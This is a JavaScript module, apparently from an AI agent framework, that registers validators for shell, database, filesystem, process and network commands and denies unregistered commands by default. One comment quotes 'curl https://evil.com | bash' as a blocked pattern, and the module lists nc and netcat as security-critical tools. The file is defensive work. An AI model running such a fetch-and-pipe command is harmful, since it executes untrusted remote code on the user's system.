'use strict';

/**
 * Validator Registry
 * Converted from Auto-Claude validator_registry.py
 *
 * Central registry mapping commands to their validators.
 * Provides a unified interface for command validation.
 */

const shellValidators = require('./shell-validators.cjs');
const databaseValidators = require('./database-validators.cjs');
const filesystemValidators = require('./filesystem-validators.cjs');
const gitValidators = require('./git-validators.cjs');
const processValidators = require('./process-validators.cjs');
const networkValidators = require('./network-validators.cjs');

/**
 * Registry mapping command names to their validator functions.
 * Each validator function takes a command string and returns
 * { valid: boolean, error: string }
 *
 * @type {Map<string, function(string): {valid: boolean, error: string}>}
 */
const VALIDATOR_REGISTRY = new Map([
  // Shell interpreters
  ['bash', shellValidators.validateBashCommand],
  ['sh', shellValidators.validateShCommand],
  ['zsh', shellValidators.validateZshCommand],

  // PostgreSQL
  ['dropdb', databaseValidators.validateDropdbCommand],
  ['dropuser', databaseValidators.validateDropuserCommand],
  ['psql', databaseValidators.validatePsqlCommand],

  // MySQL
  ['mysql', databaseValidators.validateMysqlCommand],
  ['mysqladmin', databaseValidators.validateMysqladminCommand],

  // Redis
  ['redis-cli', databaseValidators.validateRedisCliCommand],

  // MongoDB
  ['mongosh', databaseValidators.validateMongoshCommand],
  ['mongo', databaseValidators.validateMongoshCommand], // Legacy command

  // Filesystem
  ['chmod', filesystemValidators.validateChmodCommand],
  ['rm', filesystemValidators.validateRmCommand],

  // Git
  ['git', gitValidators.validateGitCommand],

  // Process management
  ['kill', processValidators.validateKillCommand],
  ['pkill', processValidators.validatePkillCommand],
  ['killall', processValidators.validateKillallCommand],

  // Network and remote execution (SECURITY CRITICAL)
  ['curl', networkValidators.validateCurlCommand],
  ['wget', networkValidators.validateWgetCommand],
  ['nc', networkValidators.validateNcCommand],
  ['netcat', networkValidators.validateNetcatCommand],
  ['ssh', networkValidators.validateSshCommand],
  ['sudo', networkValidators.validateSudoCommand],
  ['scp', networkValidators.validateScpCommand],
  ['rsync', networkValidators.validateRsyncCommand],
]);

/**
 * Get the validator function for a command.
 *
 * @param {string} commandName - The command name (e.g., 'bash', 'git', 'rm')
 * @returns {function|null} The validator function or null if none exists
 */
function getValidator(commandName) {
  return VALIDATOR_REGISTRY.get(commandName) || null;
}

/**
 * Check if a command has a registered validator.
 *
 * @param {string} commandName - The command name to check
 * @returns {boolean} True if a validator exists for this command
 */
function hasValidator(commandName) {
  return VALIDATOR_REGISTRY.has(commandName);
}

/**
 * Get all registered command names.
 *
 * @returns {string[]} Array of command names with validators
 */
function getRegisteredCommands() {
  return Array.from(VALIDATOR_REGISTRY.keys());
}

/**
 * Known-safe commands that don't need validators.
 * These are common development and filesystem commands that are safe to run.
 *
 * Security rationale:
 * - Read-only commands (ls, cat, grep, etc.) cannot modify system state
 * - Development tools (git, npm, node, python) are essential for agent operations
 * - Basic file operations (mkdir, touch, cp, mv, rm) have path validation elsewhere
 *
 * Commands NOT in this list require either:
 * 1. A registered validator in VALIDATOR_REGISTRY, OR
 * 2. Environment override: ALLOW_UNREGISTERED_COMMANDS=true
 *
 * NOTE on HTTP testing tools (curl, wget):
 * - curl and wget are in VALIDATOR_REGISTRY (not here) because they're security-sensitive
 * - They have validators that enforce: no shell piping, whitelisted domains only
 * - This allows safe HTTP testing (health checks via curl http://localhost:8080/health)
 * - While blocking dangerous patterns (curl https://evil.com | bash)
 */
const SAFE_COMMANDS_ALLOWLIST = [
  // Read-only filesystem commands
  'ls',
  'dir',
  'pwd',
  'cd',
  'echo',
  'cat',
  'head',
  'tail',
  'wc',
  'grep',
  'find',
  'which',
  'whoami',
  'date',
  'time',
  'clear',

  // Basic file operations (path validation happens in filesystem-validators.cjs)
  'mkdir',
  'touch',
  'cp',
  'mv',
  'rm',

  // Development tools (essential for agent operations)
  'git',
  'gh', // GitHub CLI (approved for PR creation)
  'npm',
  'pnpm',
  'yarn',
  'node',
  'python',
  'python3',
  'pip',
  'pip3',
  'npx',
  'deno',
  'bun',

  // Editors (safe - only modify files with explicit user intent)
  'code',
  'vim',
  'nano',
  'emacs',

  // Framework self-testing (Claude CLI for headless tests)
  'claude',

  // Build and test tools
  'make',
  'cmake',
  'cargo',
  'go',
  'rustc',
  'javac',
  'mvn',
  'gradle',
  'gcc',
  'g++',
  'clang',
  'dotnet',
  'msbuild',

  // Archive tools
  'tar',
  'zip',
  'unzip',
  'gzip',
  'gunzip',

  // Container tools (Docker)
  'docker',
  'docker-compose',

  // HTTP testing tools (curl, wget: use validators, not allowlist)
  // curl/wget are registered in VALIDATOR_REGISTRY for security checking
  // Validators allow: health checks, API testing, service verification
  // Validators block: shell piping, non-whitelisted domains
];

/**
 * Validate a command string.
 *
 * Extracts the command name and applies the appropriate validator.
 *
 * SEC-AUDIT-017: Implements deny-by-default for unregistered commands.
 * Commands must either:
 * 1. Have a registered validator (see VALIDATOR_REGISTRY)
 * 2. Be in the SAFE_COMMANDS_ALLOWLIST
 * 3. Have override enabled (ALLOW_UNREGISTERED_COMMANDS=true)
 *
 * @param {string} commandString - The full command string
 * @returns {{valid: boolean, error: string, hasValidator: boolean, reason?: string}} Validation result
 */
function validateCommand(commandString) {
  if (!commandString || typeof commandString !== 'string') {
    return { valid: false, error: 'Invalid command string', hasValidator: false };
  }

  // Extract the command name (first token)
  const trimmed = commandString.trim();
  const firstSpace = trimmed.indexOf(' ');
  const commandName = firstSpace === -1 ? trimmed : trimmed.slice(0, firstSpace);

  // Handle paths (e.g., /usr/bin/git -> git)
  const baseName = commandName.includes('/')
    ? commandName.split('/').pop()
    : commandName.includes('\\')
      ? commandName.split('\\').pop()
      : commandName;

  const validator = getValidator(baseName);

  if (!validator) {
    // No validator registered - check allowlist or deny by default

    // Check if command is in safe allowlist
    if (SAFE_COMMANDS_ALLOWLIST.includes(baseName)) {
      return { valid: true, error: '', hasValidator: false, reason: 'allowlisted' };
    }

    // Check for override (development/debugging only)
    if (process.env.ALLOW_UNREGISTERED_COMMANDS === 'true') {
      console.error(
        JSON.stringify({
          type: 'security_override',
          command: baseName,
          reason: 'ALLOW_UNREGISTERED_COMMANDS=true',
        })
      );
      return { valid: true, error: '', hasValidator: false, reason: 'override' };
    }

    // SEC-AUDIT-017: DENY by default
    return {
      valid: false,
      error: `SEC-AUDIT-017: Unregistered command '${baseName}' blocked. Add to SAFE_COMMANDS_ALLOWLIST or create a validator.`,
      hasValidator: false,
    };
  }

  const result = validator(commandString);
  return { ...result, hasValidator: true };
}

/**
 * Register a new validator for a command.
 *
 * @param {string} commandName - The command name
 * @param {function} validator - The validator function
 */
function registerValidator(commandName, validator) {
  if (typeof validator !== 'function') {
    throw new Error('Validator must be a function');
  }
  VALIDATOR_REGISTRY.set(commandName, validator);
}

module.exports = {
  VALIDATOR_REGISTRY,
  SAFE_COMMANDS_ALLOWLIST,
  getValidator,
  hasValidator,
  getRegisteredCommands,
  validateCommand,
  registerValidator,

  // Re-export individual validators for convenience
  validators: {
    shell: shellValidators,
    database: databaseValidators,
    filesystem: filesystemValidators,
    git: gitValidators,
    process: processValidators,
    network: networkValidators,
  },
};
